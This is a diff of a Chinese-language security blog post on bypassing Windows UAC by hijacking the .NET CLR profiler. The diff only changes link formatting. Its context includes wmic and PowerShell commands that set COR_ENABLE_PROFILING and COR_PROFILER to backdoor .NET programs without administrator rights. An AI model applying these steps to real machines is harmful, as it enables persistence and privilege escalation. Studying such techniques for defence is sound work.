@@ -7,7 +7,7 @@ title: Use CLR to bypass UAC
 ## 0x00 前言
 ---
 
-在之前的文章[《Use CLR to maintain persistence》](https://3gstudent.github.io/Use-CLR-to-maintain-persistence/)介绍了通过CLR劫持.Net程序的后门，特点是无需管理员权限，并能够劫持所有.Net程序。那么，如果劫持了高权限的.Net程序，就能够绕过UAC，比如gpedit.msc
+在之前的文章[《Use CLR to maintain persistence》](https://3gstudent.github.io/Use-CLR-to-maintain-persistence)介绍了通过CLR劫持.Net程序的后门，特点是无需管理员权限，并能够劫持所有.Net程序。那么，如果劫持了高权限的.Net程序，就能够绕过UAC，比如gpedit.msc
 
 最近我在clem@clavoillotte的博客上也看到了相同的利用思路，并且，他的博客里有更多值得学习的地方。于是，我对他博客介绍的内容进行了整理，结合自己的经验，适当作补充，分享给大家。
 
@@ -26,14 +26,14 @@ https://offsec.provadys.com/UAC-bypass-dotnet.html
 ## 0x02 使用CLR绕过UAC
 ---
 
-我在[《Use CLR to maintain persistence》](https://3gstudent.github.io/Use-CLR-to-maintain-persistence/)一文中使用了wmic修改环境变量，代码如下：
+我在[《Use CLR to maintain persistence》](https://3gstudent.github.io/Use-CLR-to-maintain-persistence)一文中使用了wmic修改环境变量，代码如下：
 
 ```
 wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"
 wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
 ```
 
-在[《Use Logon Scripts to maintain persistence》](https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence/)补充了使用powershell修改环境变量的方法，代码如下：
+在[《Use Logon Scripts to maintain persistence》](https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence)补充了使用powershell修改环境变量的方法，代码如下：
 
 ```
 New-ItemProperty "HKCU:\Environment\" COR_ENABLE_PROFILING -value "1" -propertyType string | Out-Null
